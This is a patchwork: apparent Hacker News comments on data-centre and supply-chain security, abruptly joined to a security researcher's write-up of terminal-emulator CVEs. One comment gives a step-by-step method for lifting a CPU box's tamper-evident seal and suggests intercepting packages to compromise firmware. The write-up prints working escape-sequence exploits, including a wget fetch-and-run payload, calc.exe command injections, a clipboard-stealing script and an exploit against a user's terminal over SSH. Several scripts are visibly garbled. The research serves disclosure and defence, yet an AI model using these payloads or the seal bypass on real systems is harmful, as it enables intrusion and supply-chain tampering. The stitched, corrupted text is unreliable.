Once law enforcement is on the other side of the cage, important customers who pay real money could get compromised.There is a massive difference between getting physical access to your server in a data center and coughing up everything about your server by simply emailing a minion in a cloud provider. reply OmarAssadi 8 hours agorootparentprevAssuming this was done at the government&#x27;s request, I assume Hetzner is more than willing to comply with a court order mandating they allow them to monitor and physically size a machine.And outside of nation-state requests, even ignoring the fact that someone could probably pay-off an employee, I think ease would depend a lot on the datacenter and target; judging by the awesome and hilarious story behind the Fremont Cabal accidentally becoming an internet exchange by essentially having some dude barely secretly slipping unauthorized cables into the raceways [1], I figure there are a lot of places where if your target is simply renting a couple rack units or single rack rather than an entire locked cage, you can probably get physical access by doing the same.Also, a lot of Deviant Ollam&#x27;s stories about industrial security and the dozens of ways he&#x27;s broken into utility companies, server rooms, etc — mostly just by being confident, looking the part, bad doors [2], and badge cloning [3] — don&#x27;t give me a ton of confidence that someone with skill couldn&#x27;t feasibly either get direct access to servers they shouldn&#x27;t, or at the very least, access to an important part of the supply chain for their target.And speaking of supply chain, my processor died recently, so I ordered a brand-new in box replacement Ryzen, and when it arrived last night, out of curiosity, I wanted to see if I could get the CPU out of the box without breaking the tamper-evident authenticity seal...... and about fifteen minutes later, after borrowing a syringe and hypodermic needle from my mom, a little bit of isopropyl alcohol, a blade from my safety razor, and a quick look at a video from LockPickingLawyer [4] and a couple from datagram at DEFCON&#x27;s Tamper-Evident Village [5][6], I had the CPU out, put my old one for now, and re-applied the sticker with no visible damage to the box or seal.All I had to do was tip it upside down at about 90-degrees, douse a little bit of the alcohol under the top of the seal, let gravity do most of the work, and then carefully lift the seal with the razor. After that, I just lightly squeezed the box to make the front tab come as forward as possible, and then carefully pushed the ear flaps down to prevent tearing, and then I was in.I&#x27;ve seen others demonstrate it on older AMD boxes that had flexible cardboard in-place of the cooler, allowing them to pull the cardboard to make enough room for tools to get out the CPU without even touching the seal [7]. But in my case, it was a newer box with hard plastic inside where the cooler would&#x27;ve been, so that&#x27;s why I went for the seal instead.No surprise to me now that counterfeiting is rampant on Amazon, with people returning the box after putting in either random junk, dead Athlons covered by a counterfeit serial-matching IHS, or the cheapest socket-compatible CPU after deluding both and swapping the IHS.I figure with a bit of practice and better tools, like Teflon spudgers and syringes, it&#x27;d be significantly easier to get past 99% of tamper-resistant&#x2F;tamper-evident seals and into boxes you&#x27;re not supposed to be without risking damage, and then you can intercept a package, compromise something critical, like the server BMC or firmware, reseal everything, and be on your way.And given the relatively recent scare with loads of servers, including Dell and others, being shipped with \"AMERICAN MEGATRANDS\" labels on their BMC boards, with no one noticing until a YouTube commenter pointed it out during a teardown by ServeTheHome, I think it&#x27;s totally feasible for an enemy to just compromise the entire physical supply-chain of a company, datacenter, or whatever else [8].[1]: Oxide&#x27;s On the Metal: Kenneth Finnegan - https:&#x2F;&#x2F;oxide.computer&#x2F;podcasts&#x2F;on-the-metal&#x2F;kenneth-finnega...[2]: Deviant Ollam @ Shakacon: The Search for the Perfect Door - https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=4YYvBLAF4T8[3]: Deviant Ollam &#x2F; Modern Rogue: Getting an RFID Implant - https:&#x2F;&#x2F;youtu.be&#x2F;SZiRISGdQ4g?t=277[4]: LockPickingLawyer: Did I Cheat On This Challenge?

Theoretically virtual machine memory is encrypted, but you&#x27;ll just have to trust the hypervisor&#x27;s word for it. You can try to verify the boot chain all the way to the hardware keys, but if the hypervisor just replaces your `JNE` with a `NOP` you&#x27;ll have a hard time automating your protections.I suppose you can transfer the keys out of the machine over the network (and hope the hypervisor doesn&#x27;t replace the socket buffers just before transmission) and verify them off site, but guest machines will always be just that: guests on a host that has all the power. reply comex 9 hours agorootparentThat is not the case for the latest CPU extensions for encrypted VMs, AMD SEV-SNP and Intel TDX, which are designed to allow remote attestation based on a key hidden in the CPU that the hypervisor does not get access to.The hypervisor only ever sees the VM’s memory in encrypted form, and it’s integrity-checked by the CPU to prevent replay attacks. reply kuschku 2 hours agorootparentprevThe Hetzner server used here was a dedicated, physical server. reply OmarAssadi 9 hours agorootparentprevI&#x27;m not sure truly verifiable \"Secure\" Boot is actually realistic in most scenarios, though, right?I&#x27;m not super up-to-date on what&#x27;s being offered right now, but I&#x27;m not sure if there is a way to have a proper trusted execution environment on most Intel or AMD offerings; I thought Secure Boot on AMD64 platforms generally rely on TPM or something like SGX for validation, with the former having seemingly a dozen different ways to be tampered with, and the latter being discontinued and being vulnerable to several different attacks, including DOWNFALL.I think EPYC and Sapphire Rapids have some sort of Trusted Execution Environment stuff with SEV-SNP and TDX, maybe? But I don&#x27;t think either option is really feasible for people paying Hetzner-like prices for hosting; Hetzner&#x27;s newest Xeon offering is seemingly Cascade Lake, and the only EPYC offered is a single-socket Rome 7502P with 128GB DDR4 for 142 euros, which seems very hard to justify, given they also offer a 7950X3D with 128GB DDR5 for ~25 euros less.Even then, I don&#x27;t think I could put my confidence in a machine I don&#x27;t own, didn&#x27;t setup, can&#x27;t physically inspect, don&#x27;t know where it came from, whether the firmware has been tampered with, etc -- especially if it is something as complex as x86, where there is seemingly at least one new horrific hardware-level vulnerability that crops up every generation or two.EDIT: I forgot Hetzner also started offering Ampere Altra servers for 200 euros. I think those have TEE of some sort with the TrustZone stuff?Not sure how secure that really is, though; I haven&#x27;t really looked into the ARM offerings as much as I should have, mostly since, if you don&#x27;t want Apple, I&#x27;m not aware of a good middle-ground between a cheap SBC and a $3,000+ Ampere server, outside of jerry-rigging some second-hand Gigabyte Cavium ThunderX2 nodes off eBay. reply lallysingh 9 hours agorootparentprevThose are best for compliance to security requirements&#x2F; standards.

However, copyright infringement reports go ignored to the point to where I stopped bothering--not that I had any right to care when I torrented loads, but it was a little annoying that ~$10 software, with no DRM, regional discounts, and a dozen ways to pay still ended up pirated to the point to where it wasn&#x27;t worth selling(fun story: I still have email records from when a pretty beloved multi-billion dollar tech company launched their ROG-clone sub-brand and pirated our XenForo plugins to use on their site instead of ponying up $10 -- maybe one day I&#x27;ll have to ask them for a laptop).CloudFlare, on the other hand, at best, just passed on whatever I send in, and whoever their actual providers were never cared either, so nothing gets done. It can feel like rackeetering; sign-up for protection from the people attacking you ...whom we also protect and refuse to take down.That said, I think 99% of small sites, personal blogs, etc, really don&#x27;t need any of the services offered; the most useful offering for most people is literally probably DNS.Game servers and gaming-related communities, or at the least the ones I am most attracted to, are just about the only thing I think requires DDoS mitigation regardless of size. Our little Garry&#x27;s Mod TTT server with a max player limit of like ~24 people would get attacked a couple of times a week at least.And good lord, the RuneScape community is another breed of toxic. The way I learned to program was by reverse engineering the game, and we&#x27;d work on private servers that were essentially from-scratch MMORPG servers that just emulated the RuneScape mechanics and protocol.One aspect of the game, though, is PvP -- when you kill another player in the wilderness, unlike in a lot of other MMOs, you get most, if not all, of their items they have on them.I could perhaps understand DDoSing another player during combat in order to steal their gear. But what made me stunned beyond belief was that when I hosted a \"spawn PKing\" server (e.g., PvP-only, but you don&#x27;t have to work for your gear; everything is free - it&#x27;s just for fun), they&#x27;d literally lure each other into TeamSpeak to grab IP addresses and DDoS each other for.... nothing :)(and so you can imagine also just how often we&#x27;d get hit with massive attacks ourselves) reply ronsor 9 hours agorootparentprevThe EU regularly de-facto tries to decide regulations for other countries.

ANSI Terminal security in 2023 and finding 10 CVEs This paper reflects work done in late 2022 and 2023 to audit for vulnerabilities in terminal emulators, with a focus on open source software. The results of this work were 10 CVEs against terminal emulators that could result in Remote Code Execution (RCE), in addition various other bugs and hardening opportunities were found. The exact context and severity of these vulnerabilities varied, but some form of code execution was found to be possible on several common terminal emulators across the main client platforms of today. Additionally several new ways to exploit these kind of vulnerabilities were found. This is the full technical write-up that assumes some familiarity with the subject matter, for a more gentle introduction see my post on the G-Research site. Terminal emulators I will talk about terminal \"emulators\". When people talk about emulators in this context, they don't mean emulation in terms of actually emulating the hardware (as now common with game consoles), but software re-implementations of physical terminal devices. In this case these are mostly terminals from Digital Equipment Corporation (DEC) such as the VT100 and later compatible (and extended) terminals in the VT (Video Terminal) range which have become a defacto standard. There are many online resources about these terminals; I will go into some necessary detail later, but if you are interested to read more background vt100.net is a great resource. Past work \"Those who cannot remember the past are condemned to repeat it.\" In a 1994 issue of phrack there is \"flash.c\" -- this floods a user's terminal with escape sequences, making it flash. This is one of the first references I can find to using this to attack users, however it was definitely known before then. The attack is interesting as it uses the talk protocol (which through talkd could write to a user's terminal at any time, to let them know another (potentially remote) user wished to \"talk\" to them. This is now clearly a historical relic, but as I'll show finding a way to write raw data to a user's terminal is the first step in the modern versions of these attacks. Moving on to this century, in 2003 HD Moore released a paper: \"Terminal Emulator Security Issues\". This is the first write-up I can find of the potential issues with terminal security, that includes more than just DoS attacks. It's worth mentioning this paper includes CVE candidates, e.g. \"CAN-2003-0063\", as at the time CVEs were relatively new. This also means tracking historical vulnerabilities before this point is harder. In 2008 Paul Szabo found a vulnerability in xterm (CVE-2008-2383). This is one of the first published examples I know of, of what I call a \"full echoback\" vulnerability, where it's possible to insert control characters into the input stream. More modern is trojan source which similarly to hidden escape sequences, uses Unicode control characters to hide some text; for example by using Unicode's Right-to-Left Override (RTLO). This paper will only cover Unicode as it relates to terminals, for more details on Unicode Source Code Handling see Unicode Technical Standard #55. Escape sequence overview Escape sequences were originally defined in ANSI X3.64, that is the ANSI standard on \"Additional Controls For Use With American National Standard Code for Information Interchange\" -- this builds on characters defined in the ASCII standard to provide control for display and printer devices. Which is a wordy way to say this is all based on an old standard; not a bad thing, it works, but it does mean there is a lot of things done in ways which wouldn't be the case in a modern standard. Escape sequences can be used for many control purposes, including changing colors, moving around the screen and querying the state of the terminal. Many end users use a terminal without needing to understand escape sequences, but just like HTML, they are there and \"view source\" while not as obvious as a context menu click is quite easy. The cat command has a -v flag which can be used to perform escaping. This can be simply combined with Unix pipes to see the raw output from some commands, for example cmatrixcat -v will show the output from cmatrix -- a console, screensaver-like implementation of the Matrix animation. (Aside: cat -v was added in BSD Unix, to some annoyance of the Bell Labs Unix team, see cat -v considered harmful (1983). Alternatives include sed -u -e 'l' and vis in BSDs.) For commands which need interactivity the simple cat -v approach won't work, many Unixes have a script command which can be used to save the full terminal output to a file. The script command is sadly not standardised, some versions support timestamps to allow replay of these saved files. (There is also asciinema which can be used like script but provides a more modern interface, including a browser based player.) Classes of vulnerability In order to understand the risk from these particular vulnerabilities and how they could be exploited I'll classify them into some classes. Misuse of escape sequences This is where an attacker can get an escape sequence written to a user's terminal and the terminal behaves as expected when that sequence is written to it. A simple example is curl -- it will in most cases simply write ASCII data to a terminal (it has some detection for binary data, but does not filter all data, and the test for binary data can be easily defeated, as it isn't intended to serve a security purpose and simply looks for NULs). This is a vulnerability when it would be reasonable for the user to expect escaping to happen. The most simple way to reason about this is to consider the backspace character, if raw ASCII is printed then even without terminal escapes it is possible to disguise the output. There are cases where this can be used to hide text, for example: $ printf \"echo evil #\\b\\b\\b\\b\\b\\bgood \\n\" > evil.sh $ cat evil.sh echo good $ sh evil.sh evil Additionally standard tools like less take backspaces into account, so in some cases text can easily be hidden when viewed with less, as is the default for git diff among other tools. (You can use less -U to see controls, but unfortunately that also includes tabs so isn't generally usable on source code. This can be improved, see less issue #335 which adds a --proc-tab option to allow tabs to be processed, but not other control characters. In code the safest way to print unknown text is to use the C isprint() function, and only output printable characters. Note that is not usually what is actually wanted, as often newlines at least will need to be included in the output. A good compromise is to only escape the terminal control characters (ESC, character 27) This provides defence in depth for the security issues described in this paper, but does not protect against confusion attacks. An interesting area is terminals that accept C1 controls (8-bit, e.g. U+009B), many do not accept these controls, particularly as how they interact with UTF-8 is un(der)specified. VTE based terminals, Kitty and WezTerm are some of the few terminals that accept C1 controls by default, within UTF-8 encoded data. My recommendation would be to not use these terminals with untrusted data. As mentioned flash.c was published in Phrack in 1994. The entry point via talkd is no longer relevant, but if we can deliver the escape sequences it uses to a terminal, the result still possible, as this isn't a vulnerability, it is simply expected VT behavior. # This simulates the effect of receiving \"flash\", a 1994 terminal DoS attack. while :; do printf \"\\033c\\033(0\\033#8\" sleep 0.1 printf \"\\033[1;3r\\033[J\" sleep 0.1 printf \"\\033[5m\\033[?5h\" sleep 0.1 done If you need to look-up an escape sequence the xterm ctlseq reference is quite good and documents all the sequences xterm supports. To break that down: First line: ESC c Full Reset (RIS) ESC ( 0 Designate G0 Character Set, where 0 means \"DEC Special Character and Line Drawing Set\" from the VT100 ESC # 8 DEC Screen Alignment Test (DECALN), fully fills the screen with \"E\" characters Second line: ESC [1;3r Set Scrolling Region (DECSTBM), limits the scrolling area to the top 3 lines of the screen. ESC [J Erase in Display (ED), as the terminal has been reset the cursor is at the top left, so this erase below actually erases the whole display. Between this and the screen alignment test is what causes the flashing. Third line: ESC [5m Select Graphic Rendition (SGR), 5 (blink). This doesn't actually do anything as it doesn't print any normal characters between this and the reset. ESC [?5h Reverse Video (DECSCNM), this swaps the background and foreground. As you can see there's lots of possibilities here, changing the character set is particularly nasty as something like hello world will become ␤␊┌┌⎺ ┬⎺⎼┌␍. There are additional things such as using invisible attributes (SGR 8, supported by some terminals), the same color for the foreground and background which can be used to hide text from a victim, or at least annoy them. Additionally modern terminals support escape sequences related to the environment they run within, for example setting the title, getting the size of the window and mouse reporting. As we'll see some of those can lead to trouble. CWE-150 contains some further references to CVEs where incorrect or missing terminal escaping led to bugs. Queries and Echoback Escape sequences are used both for sending data to the terminal (e.g. changing color, sending queries), as well as receiving data from the terminal (e.g. special key presses, replies to queries). Queries are particularly interesting, as they are one of the main ways a terminal can be exploited. In particular some queries make it possible to query for a state the attack may control; the first known write-up of this is in HD Moore's work in 2003. HD Moore's example is: echo -e \"\\e]2;;wget 127.0.0.1/.bd;sh .bd;exit;\\a\\e[21t\\e]2;xterm\\aPress Enter>\\e[8m;\" This sets the title to a wget command and then runs the shell script downloaded. It asks for the title to be reported, then sets the text to be invisible. Since then nearly all terminals disable title reporting by default (but some do have an option to enable it). However I found several terminals in 2022 that did enable it by default. WezTerm: Disabled in: https://github.com/wez/wezterm/commit/e70f97903b8e5de8e918b9d9a1c68f80a1977425 This meant the unmodified command from 2003 worked against WezTerm. However WezTerm correctly implements the VT100 state machine, so this was only a \"limited echoback\" attack. SwiftTerm: Similar to WezTerm, disabled in: https://github.com/migueldeicaza/SwiftTerm/commit/a94e6b24d24ce9680ad79884992e1dff8e150a31 ConEmu: Tracked in CVE-2022-46387 and CVE-2023-39150 The difference with the ConEmu variant of the title bug, is because it accepted control characters, it was possible to run commands without any user interaction. If an attacker could find a way to write to the terminal, they could almost certainly execute commands. Additionally the first fix did not fully fix the issue -- the author disabled certain control characters only (one control character that can bypass this is ^O which GNU readline uses as \"accept and history next\", which clink, as shipped with Cmder enables by default) -- the fixed version fixes the no-user-interaction version but is still technically vulnerable to the 2003 attack version (the author for some reason doesn't seem to want to just remove the feature, I even offered a patch which disabled it). I am calling this class of attack as found against ConEmu a \"full echoback\", i.e. the attacker can fully control the sequences that are echoed back (including newlines and Control-C). Although not escape (except in iTerm2, which supports two escape characters to escape escape in some contexts). I am using the word \"echoback\" to describe cases where a terminal will respond with some data that is sent to it. It is also possible to use some built in terminal queries to make the terminal write predictable text to the input stream. Usually these do not include a newline character, so are limited and not controlled by the attacker. (An exception is rxvt-unicode CVE-2021-33477. However it is possible to make the terminal reply with strings like \"rgb:xxx/xxx/xxx\", which are somewhat attacker controllable; for example if an attacker can create a file at a particular path they may be able to attack the user. This is discussed later. A further example of using escape sequences in unexpected ways can be found in solid-snail's research. They disclosed two issues in iTerm2: https://blog.solidsnail.com/posts/2023-08-28-iterm2-rce -- they had independently discovered some of the ideas like using \"rgb:.../\" as a file path. Buffer overflow in parsing A terminal is dealing with parsing a lot of data and are commonly written in memory unsafe languages, so it is not surprising to find buffer overflows. One particular example is Sixel which is the DEC graphics format. It has had various overflows in the past, for example in its implementation in xterm and in libraries such as libsixel. xterm CVE-2022-24130 was found by Nick Black. This was a flaw in the repeat operator that is present in the Sixel format and there was no bounds checking on the operator, for example: printf '\\ePq#1;1;1#1!99999999@\\e\\\\\\n' Will crash xterm before the fix. I spent some time fuzzing xterm and found one more Sixel issue, which is fixed in xterm 380 (along with several other bugs I found). Lack of escaping in processing It is common for the strings sent via OSC to be further processed by terminals. There have been several cases where this results in a terminal not escaping the input sent to the terminal when it is further processed, e.g. running a command. Windows Terminal + WSL CVE-2022-44702 By using the ConEmu specific escape sequence OSC 9;9 to set a working directory that contained a \", it was possible to run an arbitrary command when a WSL tab was duplicated (ctrl+shift+d, or context menu item). The exploit for this is to arrange for this string to be sent to the victim's terminal: printf \"\\e]9;9;/\\\" sh -c 'calc.exe && cd && exec \\$SHELL' -- \\\"o /\\a\" Then when the victim duplicates the tab (assuming they've not configured the shell working directory integration, which will undo the exploit) it will open calculator. This was demonstrated in my BlueHat talk (a version is embedded below, too). rxvt-unicode background OSC CVE-2022-4170 This was a fun one, the terminal supports a custom OSC for setting the background, which it turned into its own special configuration language, which was 'eval'ed as Perl code, while it tried to quote the input, it didn't do it correctly. Rather than write it again, I quote the advisory I sent to oss-security below: The \"background\" extension is automatically loaded if certain X resources are set such as 'transparent' (see the full list at the top of src/perl/background[1]). So it is possible to be using this extension without realising it. This is accidentally fixed on version 9.30, and I haven't confirmed 9.29, it appears to not be exploitable, but only due to another (not security) bug. The actual bug which makes this not vulnerable on 9.30 is simply a wrong number in \"on_osc_seq\". For 9.25 and 9.26 the patch at[2] can be backported. The body of the fix is: sub q0 { - (my $str = shift) =~ s/\\x00//g; # make sure there really aren't any embedded NULs - \"q\\x00$str\\x00\" + \"qq\\x00\\Q$_[0]\\E\\x00\" } Isn't Perl quoting fun? Paranoid people may wish to remove the entire \"on_osc_seq\" subroutine to avoid passing any potentially untrusted input anywhere near eval (this feature is deprecated and the maintainer did mention they are considering what to do longer term). It doesn't make sense to withhold an exploit for this; the fix gives a pretty good idea where to look and this isn't vulnerable in the latest version. $ urxvt -transparent Inside that running terminal: # Make tint be \"\\\\\", which means the ending \\x00 is quoted under our control $ printf '\\e]705;\\\\\\a' # Make the second q0 end the quoted q-string and then be valid perl under our control $ printf '\\e]20;,rootalign root),`touch /tmp/cve-2022-4170` #\\a' The Windows Terminal and rxvt-unicode examples are two I found, there have been other vulnerablities, for example Carter Sande found CVE-2022-41322 in Kitty, where the OSC to generate desktop notifications could be abused in a similar way. DoS There are many possibilities for Denial-of-Service. These are less interesting as really they are an inconvenience, the user can recover fairly quickly in most cases, although in some cases they may be persistent, which means the user may clean up and hide other tracks of an attacker or similar. iTerm2 REP This uses the ANSI repeat sequence, to repeat a character many times, which resulted in the terminal running out of memory (and \"beachballing\"). Simple example: perl -le'print \"x\\e[2000000000b\"' This was fixed in https://github.com/gnachman/iTerm2/commit/438fe6000 Pretty amusing, but not really an issue except to crash the terminal. This was further covered by STÖK in his talk, where for example emojis result in more memory usage in some cases. Some terminals are still vulnerable to this or minor variants. Windows Terminal OSC8 (hyperlink) A long URL could result in a crash when the tooltip was displayed. The displayed URL length is now limited. OpenBSD: Console DoS This was via overflows on parameters. Also affected NetBSD. Can give limited memory write, may be exploitable on 32-bit, if a kernel memory address info leak is found. Fix: https://ftp.openbsd.org/pub/OpenBSD/patches/7.2/common/021_wscons.patch.sig Some exploits for these are: printf '\\eP2$t99999999\\e\\\\' printf '\\e[0;10r\\e[20d\\e[2000Bx' printf '\\e[0;2r\\e[5f\\e[2000M' I also found a later issue where the escape sequence parameter parsing itself could be overflowed, this was fixed in: https://ftp.openbsd.org/pub/OpenBSD/patches/7.3/common/014_wscons.patch.sig (this one was also assigned CVE-2023-40216 An exploit that crashes this looks something like: perl -e'print \"\\e[\"; print \";\" x 128 for 1 .. 2**24; print \";;;;31m\\n\"' > bigesc cat bigesc (Yes, that's ~2GiB of semicolons.) Setting icons For example xterm can load icons from local filesystem in response to an OSC. This led to a local xterm DoS being possible through XPM via CVE-2022-46285: printf \"/* XPM */\\n/*\" > /tmp/f printf \"\\e]I/tmp/f\\a\" CyberARK's research: DoS via fast title updates This was discovered by Evitar Gerzi, and covered in the CyberARK blog post. Leaks There are some ways that terminals can leak data unexpectedly, and possibly in a way that is invisible to the user. xterm OSC 52 (clipboard) xterm implements OSC 52 for reading and writing the clipboard. The upstream default is to enable this, luckily many distributions set this off by default (Debian, Red Hat, OpenBSD). A privileged remote attacker can do this in the background, i.e. watch a user's clipboard over SSH. For example: #!/bin/bash # Clipboard read via OSC 52 # David Leadbeater, 2023pid=${1:?$'\\e'\"[GUsage: $0 pid-of-shell\"} tty=\"/dev/$(ps -otty -p$pidtail -1)\" kill -STOP $pid trap \"kill -CONT $pid\" EXIT printf \"\\e]52;sc;?\\a\" > $tty read -d \"$(printf \"\\a\")\" xcve-2022-45063 cat cve-2022-45063 # or another way to deliver this to the victim Will touch that file. It will leave the line on the user's screen; I'll leave it as an exercise for the reader to use the vi line editing commands to hide the evidence. Debian, Red Hat and others disable font ops by default. [...] Additionally upstream xterm does not disable them by default, so some distributions include a vulnerable default configuration. (Demo in Everything Open Talk.) This bug in xterm was assigned CVE-2022-45063, it was fixed in xterm patch #375. I found an interesting variant of this in mintty, which also implements OSC 50, including the query capability, but it echoed back exactly what was sent -- a full echoback (i.e. any character could be injected, leading to potential code execution if an attacker can write unescaped output to the terminal). The details for DECRQSS below therefore also apply to this issue in mintty. This variant in mintty was assigned CVE-2023-39726, it was fixed in mintty version 3.6.5. DECRQSS This vulnerability was first reported in xterm in 2008, tracked as CVE-2008-2383. An interesting detail of this is we now have easy access to the DEC manuals and they confirm that there should be no reply to an invalid request. (But note that there was a mistake in the documentation, as the response code was backwards). I have confirmed on a real VT520 that it does not ever return any user controllable text for an unknown DECRQSS sequence. Which means this somehow is a difference that was introduced into the xterm control sequence documentation, which unfortunately multiple terminal emulators then faithfully reimplemented. The xterm documentation has now been fixed (in 2023). The issue is a terminal can echoback the data sent to it. In this case the severity varies in different terminals. iTerm2 iTerm2 CVE-2022-45872 resulted in a near full echoback. The only condition that must be met is any control character has to be the last character in the escape sequence. But it is possible to send multiple escape sequences, and in some cases iTerm2 will appear to buffer the output until a final DECRQSS sequence is sent without any control characters. This was fixed in iTerm2 3.4.18. mintty mintty CVE-2022-47583 resulted in a full echoback (i.e. any character could be injected, leading to potential code execution if an attacker can write unescaped output to the terminal). It was fixed in mintty 3.6.3 (part of this commit). See \"less\" below for a demo using this bug to run an attacker controlled command when the user merely types \"git log\". SwiftTerm CVE-2022-23465 was also a full echoback. Kitty Kitty had a variant which allowed non-control characters to be echoed back (a limited echoback). This was not assigned a CVE. It was fixed in this commit. libvterm This did not receive a CVE, it only allowed echoing back around 3 characters. As this library is embedded into Vim and Neovim, there were possible ways it could be attacked via Vi mode. Report on huntr.dev. zutty I did not find this one, credit to Carter Sande for finding CVE-2022-41138. This one has some limits on the length of the string, but could be exploited in a similar way to the others, aside from very long strings. Vulnerabilities using known replies Even with the fixes above there are cases where a terminal will reply with a sequence like ESC \"/Z\" which can be used to output data. ESC \"/Z\" is a VT52 compatibility sequence that has the purpose of identifying the version of the terminal and is almost certainly not used anymore. Given a Unix shell will usually run a command based on the relative path if it contains a \"/\" it is possible to do something like attack a user who happens to cd into /tmp, or otherwise deliver a file. Here's an exploit for busybox tar: #!/bin/sh # Busybox sh + tar, exploit, based on observation on oss-security: # https://www.openwall.com/lists/oss-security/2021/05/17/1 (see the \"exercise # for the reader\") # Note this doesn't use the \"newline\" embedding attack from rxvt, so the user # has to press enter, but we mess up their terminal and put a \";\" in the # output, so if they type something other than ^C and/or press enter it works. # # David Leadbeater, 2022. tmp=$(mktemp -d) pushd $tmp # rxvt-unicode and xterm -ti 100 mkdir -p 2c echo \"touch /tmp/owned-by-tar && printf '\\\\e[31;43m -- Oh! look in /tmp --\\\\e[m\\n'\" > 2c/\"Z[?1\" chmod +x 2c/\"Z[?1\" # xterm -ti 102 mkdir -p Z/ZcZ ln -s ../../2c/\"Z[?1\" Z/ZcZ/Zc # (Two terminals included just to demonstrate this does depend on the # terminal's behaviour, but it's possible to target several via an escape that # results in a response longer than busybox's sh's escape handling buffer.) # Remove the \"\\e30m\" to stop black text and see what's happening. touch 2c/$(perl -e'print \"\\e[30m\\e[c\\e[?2l\"; print \"\\eZ\" x 14; printf \"\\e4;2m')\" set -x # Make it work both if someone does cd /tmp/, or lswithin /tmp ln -sf /tmp 4 mkdir -p rgb:ffff/0000 catrgb:ffff/0000/000065535 printf '\\n\\e[;31m\\e#3Well hello '$(uname -sr) printf '\\n\\e[;31m\\e#4Well hello '$(uname -sr) echo EOF chmod +x rgb:ffff/0000/000065535 echo \"Now, do something like cd /tmp/\" In many ways this exploit is much like the tar exploit above, however it contains an interesting escape sequence I'd like to draw attention to, it targets xterm and xterm has a way to turn control characters into escape sequences. This means a user cannot simply press Control-C to cancel the command, and may end up pressing keys, until they press the only key which works, which happens to be Enter, running the attacker controlled command line (if you are paranoid something like this has happened to you, the safest thing to do is likely close the terminal). Mitigating echoback vulnerabilities I mentioned at the start of this paper that terminals \"emulate\" VT100 or later devices. This is interesting because ANSI X3.64-1979 does not define what to do in error conditions. However because most terminal emulators have claimed to be compatible with VT100 they should reimplement the error conditions in a similar way -- this has been documented in https://vt100.net/emu/dec_ansi_parser To again draw a comparison with HTML, this is similar to how the HTML 5 specification defines how parsing should behave in the presence of invalid characters (see \"Warning\" in 13.2.3). HTML spec: The decoder algorithms describe how to handle invalid input; for security reasons, it is imperative that those rules be followed precisely. Differences in how invalid byte sequences are handled can result in, amongst other problems, script injection vulnerabilities (\"XSS\"). Therefore, if terminal authors are reading this, please try to be exactly compatible with VT100 parsing. For example, an OSC sequence (osc_string) ignores control characters. (With one exception; do not implement C1 control characters, they conflict with UTF-8 and the world doesn't use them anymore. See this oss-security post from 2015 for more details.) If we reduce the chances of control characters being in escape sequences, particularly replies, then shells can correctly handle replies (although there will still be cases where a reply is partly read and so on returning to the shell only the end of it will be seen, but a single response should not provide enough for a successful attack). GNU readline has a \"skip-csi-sequence\" function, which is by default unbound. We can set it up like so: bind '\"\\e[\": skip-csi-sequence' This provides some protection from unexpected input, however we also need to implement \"skip-osc-sequence\" and \"skip-dcs-sequence\". I have a patch for this. TODO. With Zsh ZLE we can actually implement this ourselves: function skip-csi-sequence() { local key while read -sk key && (( $((#key))0x7E )); do # empty body done } function skip-osc-sequence() { local key while read -sk key && (( $((#key)) != 0x1B && $((#key)) != 0x07 )); do # empty body done if [[ $((#key)) = 27 ]]; then # ^[\\ read -sk key fi } function skip-dcs-sequence() { local key while read -sk key && (( $((#key)) != 0x1B )); do # empty body done if [[ $((#key)) = 27 ]]; then # ^[\\ read -sk key fi } zle -N skip-csi-sequence zle -N skip-osc-sequence zle -N skip-dcs-sequence bindkey '\\e[' skip-csi-sequence bindkey '\\e]' skip-osc-sequence bindkey '\\eP' skip-dcs-sequence Downside: Alt+P conflicts with DCS. Exploitability Often these terminal issues, while they are clearly serious, are not treated with the severity a web browser bug or other issue that clearly is immediately exposed to untrusted data. It should be remembered that a terminal does still deal with untrusted data, even if there is another layer of defence that programs outputting to them should escape data. These are some examples of potential exploit chains, using a tool that did not correctly escape data. Kubernetes kubectl did not filter escape characters (CVE-2021-25743). This was discovered by Evitar Gerzi. I discovered it's possible to abuse without API access, i.e. write to /dev/termination-log. Interestingly Kubernetes did not consider this a serious issue and the CVE sat unfixed for a while, so I fixed it after finding several terminal vulnerabilities. There is a full PoC demo at https://github.com/dgl/houdini-kubectl-poc Local HTTP server Again to call back to 2003, the scenario in HD Moore's paper is an administrator running tail on their web logs. These days a more likely scenario is a user running a command like python3 -m http.server. It turns out Python did not escape control characters that it outputted in its http.server module. This allows several attacks, even if the terminal itself does not have a vulnerability. The first one is hiding things in logs. printf \"GET /?\\e]0; HTTP/1.0\\r\\n\\r\\n\"nc localhost 8000 Using the DECRQSS bug leads to something like: printf \"GET /?\\ePqm\\x3\\e\\\\ \\ePqm;ls;\\e\\\\ \\ePqm\\r\\e\\\\ HTTP/1.0\\r\\n\\r\\n\"nc localhost 8000 Other command line web server tooling may be vulnerable to similar, some I've reported it to don't even seem to consider it a security issue, but note request spoofing or hiding is usually possible to some extent. Reverse SSH shell This exploit has the property that it does not need another vulnerable program to get the escape characters to the user, it just uses Unix permissions. For this to work the attacker needs the ability to either run code as the user, or root on the host they are SSHed to. It can then escape back to the host the user SSHed from if there's a suitable terminal vulnerability (and the user connected from a local shell, i.e. they typed ssh host, rather than invoking SSH from a menu or similar). Clearly this needs a vulnerable terminal, rather than being an expected possibility as SSH agent hijacking can be, if SSH jump boxes are used. #!/bin/bash # Disconnect a user and attempt a terminal exploit on them # David Leadbeater, 2023pid=${1:?$'\\e'\"[GUsage: $0 pid-of-shell\"} tty=\"/dev/$(ps -otty -p$pidtail -1)\" kill -STOP $pid printf '\\eP$q;xxx;open -a Calculator\\r\\e\\\\ \\eP$qm\\e\\\\' > $tty kill -9 $pid less I found an issue in less where OSC 8 (hyperlink) was not terminated by anything but a ^G (BEL) or ESC \\ (ST), whereas most terminals take ESC and any character as a terminating sequence (and should, per the VT100 state machine mentioned elsewhere in this paper). The less author unfortunately patched this without a security release, so I posted to oss-security about it, when it was only available as a patch. This can be combined with \"git\" to achieve RCE in a git repo. e.g. with mintty which is default terminal on git for windows and had the DECRQSS bug. The exploit for less, git bash and mintty is to simply get a string like this into a git commit message, then git log will open Calculator: ^[]8;;http://^[c^[P$qm q :;calc.exe;^M^[\\ top It turns out some versions of Linux's top (procps) don't escape output. The top authors have fixed in 4.x, but procps on many Linux distros is still 3.x. Top authors aren't hugely concerned because there's other ways to hide from process tools on Linux (e.g. CVE-2018-1121). I demonstrated how to use a bug in xterm's ReGIS support to own someone running top in my DEF CON talk. ReGIS is a vector graphics mode that happens to have a report command, it could be asked to set a particular name, then report that name. The xterm bug is CVE-2023-40359 and was fixed in xterm 380 